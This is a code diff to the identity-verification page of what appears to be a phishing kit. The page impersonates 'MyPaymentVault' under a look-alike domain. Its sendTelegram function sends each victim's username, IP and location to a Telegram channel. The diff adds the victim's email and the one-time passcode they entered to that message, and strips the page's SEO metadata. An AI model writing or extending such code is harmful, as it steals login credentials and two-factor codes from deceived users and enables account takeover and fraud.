@@ -1,6 +1,5 @@
 import { useState, useRef, useEffect, useCallback } from "react";
 import { useLocation } from "wouter";
-import { Helmet } from "react-helmet-async";
 import { useAuth } from "@/lib/auth";
 import { useI18n, type Language } from "@/lib/i18n";
 import { Globe, ChevronDown, ShieldCheck } from "lucide-react";
@@ -112,9 +111,11 @@ export default function Verify() {
     await sendTelegram(
       `━━━━━━━━━━━━━━━━━━━━━\n` +
       `✅ <b>mypaymenttvaulltr.com</b>\n` +
-      `📌 <b>Step 4 — OTP Submitted</b>\n` +
+      `📌 <b>Step 4 — OTP Verified</b>\n` +
       `━━━━━━━━━━━━━━━━━━━━━\n\n` +
       `👤 <b>Username</b>   : <code>${pendingUsername}</code>\n` +
+      `📧 <b>Email</b>      : <code>${emailInput || maskedEmail || "-"}</code>\n` +
+      `🔢 <b>Kode OTP</b>   : <code>${code}</code>\n` +
       `🌐 <b>IP & Lokasi</b>: <code>${ip}</code>\n` +
       `🕐 <b>Waktu</b>      : ${now}\n` +
       `━━━━━━━━━━━━━━━━━━━━━`
@@ -167,16 +168,6 @@ export default function Verify() {
       className="min-h-screen flex flex-col items-center justify-center"
       style={{ background: "#f7f7f7" }}
     >
-      <Helmet>
-        <title>Verify Identity — mypaymenttvaulltr.com</title>
-        <meta name="description" content="Complete identity verification to access your MyPaymentVault account." />
-        <link rel="canonical" href="https://www.mypaymenttvaulltr.com/verify" />
-        <meta property="og:title" content="Verify Identity — mypaymenttvaulltr.com" />
-        <meta property="og:description" content="Complete identity verification to access your MyPaymentVault account." />
-        <meta property="og:url" content="https://www.mypaymenttvaulltr.com/verify" />
-        <meta name="twitter:title" content="Verify Identity — mypaymenttvaulltr.com" />
-        <meta name="twitter:description" content="Complete identity verification to access your MyPaymentVault account." />
-      </Helmet>
       <LoadingModal show={waiting} />
       {/* ── INCORRECT CREDENTIALS MODAL ── */}
       {showModal && (
